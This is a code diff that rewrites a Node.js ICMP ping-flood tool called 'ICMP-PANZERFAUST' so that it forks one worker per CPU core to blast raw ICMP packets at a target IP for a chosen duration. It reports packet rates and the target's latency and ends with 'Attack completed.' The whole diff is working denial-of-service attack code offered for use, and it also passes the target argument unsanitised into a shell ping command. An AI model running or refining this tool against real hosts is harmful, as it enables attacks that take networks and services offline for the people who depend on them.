@@ -1,147 +1,118 @@
+const cluster = require('cluster');
 const raw = require('raw-socket');
+const os = require('os');
 const { exec } = require('child_process');
 
-if (process.argv.length < 4 || process.argv.length > 5) {
-  console.log('Usage: node attack.js <target_ip> <duration_seconds> [multiplier]');
+const target = process.argv[2];
+const duration = parseInt(process.argv[3]) * 1000;
+
+if (!target || !duration) {
+  console.log('Usage: node attack.js <target_ip> <duration_sec>');
   process.exit(1);
 }
 
-const target = process.argv[2];
-const durationMs = parseInt(process.argv[3], 10) * 1000;
-const multiplier = process.argv[4] ? Math.max(1, parseInt(process.argv[4], 10)) : 1;
+const cpus = os.cpus().length;
 
-const sockets = [];
-const MAX_INFLIGHT_PER_SOCKET = 1000;
+let endTime = Date.now() + duration;
 
-function checksum(buf) {
-  let sum = 0;
-  for (let i = 0; i < buf.length; i += 2) {
-    sum += buf.readUInt16BE(i);
+if (cluster.isMaster) {
+  let stats = { sent: 0, success: 0, failed: 0, pps: 0, maxpps: 0 };
+  let lastLatency = 'N/A';
+
+  console.clear();
+  console.log('ICMP-PANZERFAUST [HYPERSONIC]');
+  console.log('--------------------------------------');
+  console.log(`Target: ${target}`);
+  console.log(`Duration: ${duration / 1000}s`);
+  console.log(`Cores: ${cpus}`);
+  console.log('Starting blast...\n');
+
+  for (let i = 0; i < cpus; i++) cluster.fork();
+
+  for (const id in cluster.workers) {
+    cluster.workers[id].on('message', msg => {
+      if (msg.type === 'stats') {
+        stats.sent += msg.sent;
+        stats.success += msg.success;
+        stats.failed += msg.failed;
+        stats.pps += msg.pps;
+        if (msg.pps > stats.maxpps) stats.maxpps = msg.pps;
+      }
+    });
   }
-  while (sum >> 16) {
-    sum = (sum & 0xFFFF) + (sum >> 16);
-  }
-  return ~sum & 0xFFFF;
-}
 
-function createICMPPacket(seq) {
-  const buf = Buffer.alloc(8);
-  buf.writeUInt8(8, 0);
-  buf.writeUInt8(0, 1);
-  buf.writeUInt16BE(0, 2);
-  buf.writeUInt16BE(process.pid & 0xFFFF, 4);
-  buf.writeUInt16BE(seq & 0xFFFF, 6);
-  const csum = checksum(buf);
-  buf.writeUInt16BE(csum, 2);
-  return buf;
-}
+  setInterval(() => {
+    console.clear();
+    console.log('ICMP-PANZERFAUST [HYPERSONIC]');
+    console.log('--------------------------------------');
+    console.log(`Success: ${stats.success}`);
+    console.log(`Failed: ${stats.failed}`);
+    console.log(`Max PPS: ${stats.maxpps}`);
+    console.log(`Total sent: ${stats.sent}`);
+    console.log(`Target latency: ${lastLatency} ms`);
+    console.log('--------------------------------------');
+    stats.pps = 0; // reset per 100ms
+  }, 100);
 
-let sent = 0;
-let success = 0;
-let failed = 0;
-let ppsCounter = 0;
-let maxPPS = 0;
-let lastLatency = 'N/A';
+  setInterval(() => {
+    exec(`ping -c 1 ${target}`, (err, stdout) => {
+      const match = stdout.match(/time=([\d.]+) ms/);
+      if (match) lastLatency = match[1];
+    });
+  }, 4000);
 
-const endTime = Date.now() + durationMs;
-
-function getPingLatency(ip, callback) {
-  const platform = process.platform;
-  let cmd = platform === 'win32' ? `ping -n 1 ${ip}` : `ping -c 1 ${ip}`;
-
-  exec(cmd, (error, stdout) => {
-    if (error) {
-      callback(null);
-      return;
-    }
-    let timeMatch = null;
-    if (platform === 'win32') {
-      timeMatch = stdout.match(/Average = (\d+)ms/) || stdout.match(/time=(\d+)ms/);
-    } else {
-      timeMatch = stdout.match(/time=([\d.]+) ms/);
-    }
-    callback(timeMatch && timeMatch[1] ? timeMatch[1] : null);
-  });
-}
-
-function clearConsoleLines(n) {
-  for (let i = 0; i < n; i++) {
-    process.stdout.write('\x1b[1A');
-    process.stdout.write('\x1b[2K');
-  }
-}
-
-function liveLog(final = false) {
-  const currentPPS = ppsCounter * 10;
-  if (currentPPS > maxPPS) maxPPS = currentPPS;
-
-  if (!final) clearConsoleLines(9);
-
-  process.stdout.write('ICMP-PANZERFAUST\n');
-  process.stdout.write('--------------------------------------\n');
-  process.stdout.write(`Success: ${success}\n`);
-  process.stdout.write(`Failed: ${failed}\n`);
-  process.stdout.write(`Max PPS: ${maxPPS.toFixed(2)}\n`);
-  process.stdout.write(`Total sent: ${sent}\n`);
-  process.stdout.write(`Target latency: ${lastLatency} ms\n`);
-  process.stdout.write('--------------------------------------\n');
-
-  ppsCounter = 0;
-
-  if (final) {
-    sockets.forEach(s => s.close());
+  setTimeout(() => {
+    for (const id in cluster.workers) cluster.workers[id].kill();
+    console.log('\nAttack completed.');
     process.exit(0);
-  }
-}
+  }, duration);
 
-function startFlood(socketIndex) {
-  let inflight = 0;
-  let seq = 0;
+} else {
   const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
-  sockets.push(socket);
+  let seq = 0;
+  let inflight = 0;
+  let sent = 0;
+  let success = 0;
+  let failed = 0;
+  let pps = 0;
 
-  function floodLoop() {
-    if (Date.now() >= endTime) {
-      liveLog(true);
-      return;
-    }
-
-    while (inflight < MAX_INFLIGHT_PER_SOCKET && Date.now() < endTime) {
-      const packet = createICMPPacket(seq++);
-      inflight++;
-      socket.send(packet, 0, packet.length, target, (err) => {
-        sent++;
-        ppsCounter++;
-        inflight--;
-        if (err) failed++;
-        else success++;
-      });
-    }
-
-    setImmediate(floodLoop);
+  function checksum(buf) {
+    let sum = 0;
+    for (let i = 0; i < buf.length; i += 2) sum += buf.readUInt16BE(i);
+    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
+    return ~sum & 0xffff;
   }
 
-  floodLoop();
-}
+  function createICMPPacket(seq) {
+    const buf = Buffer.alloc(8);
+    buf.writeUInt8(8, 0);
+    buf.writeUInt8(0, 1);
+    buf.writeUInt16BE(0, 2);
+    buf.writeUInt16BE(process.pid & 0xffff, 4);
+    buf.writeUInt16BE(seq & 0xffff, 6);
+    const cs = checksum(buf);
+    buf.writeUInt16BE(cs, 2);
+    return buf;
+  }
 
-function updateLatency() {
-  getPingLatency(target, (lat) => {
-    lastLatency = lat !== null ? lat : 'N/A';
-  });
-}
+  function loop() {
+    if (Date.now() >= endTime) process.exit(0);
+    const pkt = createICMPPacket(seq++);
+    inflight++;
+    socket.send(pkt, 0, pkt.length, target, err => {
+      sent++;
+      pps++;
+      inflight--;
+      if (err) failed++;
+      else success++;
+    });
+    setImmediate(loop);
+  }
 
-console.log('ICMP-PANZERFAUST');
-console.log('--------------------------------------');
-console.log(`Target: ${target}`);
-console.log(`Duration: ${durationMs / 1000}s`);
-console.log(`Multiplier: ${multiplier}x`);
-console.log('Starting attack...\n');
+  loop();
 
-liveLog();
-
-setInterval(liveLog, 100);
-setInterval(updateLatency, 4000);
-
-for (let i = 0; i < multiplier; i++) {
-  startFlood(i);
+  setInterval(() => {
+    process.send({ type: 'stats', sent, success, failed, pps });
+    pps = 0;
+  }, 100);
 }
